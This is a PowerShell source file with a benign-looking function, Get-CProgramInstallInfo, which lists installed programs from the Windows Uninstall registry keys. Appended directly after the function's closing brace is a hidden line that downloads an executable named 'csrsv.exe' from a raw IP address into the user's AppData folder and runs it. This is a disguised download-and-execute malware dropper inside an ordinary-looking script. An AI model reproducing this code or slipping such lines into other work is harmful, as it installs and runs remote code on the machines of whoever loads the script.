function Get-CProgramInstallInfo{[CmdletBinding()][OutputType([Carbon.Computer.ProgramInstallInfo])]param([string]$Name)Set-StrictMode -Version 'Latest'Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionStateif( -not (Test-Path -Path 'hku:\') ){$null = New-PSDrive -Name 'HKU' -PSProvider Registry -Root 'HKEY_USERS'}('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall','hku:\*\Software\Microsoft\Windows\CurrentVersion\Uninstall\*') |Where-Object { Test-Path -Path $_ -PathType Container } | Get-ChildItem | Where-Object { $valueNames = $_.GetValueNames()[Microsoft.Win32.RegistryKey]$key = $_if( $valueNames -notcontains 'DisplayName' ){Write-Debug ('Skipping {0}: DisplayName not found.' -f $_.Name)return $false}$displayName = $_.GetValue( 'DisplayName' )if( $valueNames -contains 'ParentKeyName' ){Write-Debug ('Skipping {0} ({1}): found ParentKeyName property.' -f $displayName,$_.Name)return $false}if( $valueNames -contains 'SystemComponent' -and $_.GetValue( 'SystemComponent' ) -eq 1 ){Write-Debug ('Skipping {0} ({1}): SystemComponent property is 1.' -f $displayName,$_.Name)return $false}return $true} |Where-Object { if( $Name ) { return $_.GetValue('DisplayName') -like $Name } return $true} | ForEach-Object { New-Object 'Carbon.Computer.ProgramInstallInfo' $_ }}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")